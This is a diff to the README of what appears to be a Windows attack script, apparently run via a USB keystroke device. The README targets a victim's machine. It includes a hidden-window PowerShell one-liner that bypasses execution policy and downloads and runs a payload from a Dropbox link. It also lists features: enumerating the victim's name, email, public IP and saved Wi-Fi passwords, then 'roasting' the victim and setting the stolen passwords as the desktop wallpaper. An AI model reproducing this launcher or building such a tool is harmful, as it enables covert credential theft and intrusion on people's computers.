@@ -31,7 +31,7 @@ Image generated will be saved to desktop, steganography is used to put hidden me
 
 ### Dependencies
 
-* DropBox 
+* DropBox - Your Shared link for the intended file
 * Windows 10,11
 
 <p align="right">(<a href="#top">back to top</a>)</p>
@@ -46,6 +46,7 @@ powershell -w h -NoP -NonI -Exec Bypass $pl = iwr https:// < Your Shared link fo
 * Enumerate and get Full Name, Amount of RAM, Public IP, Wifi Password Length, Wifi Networks and Passwords, Day Password was last changed, Email
 * Custom responses have been programmed to roast the target based on the information gathered during enumeration phase 
 * Wifi Networks and passwords will be generated into an image that will be saved on the desktop
+* Image opened in notepad will reveal a hidden message at the bottom of the binary output
 * Script will freeze until a mouse movement is detected 
 * Sapi Speak will be used to speak out loud the custom responses 
 * Desktop wallpaper will be changed to the image of the targets Wifi Networks and Passwords
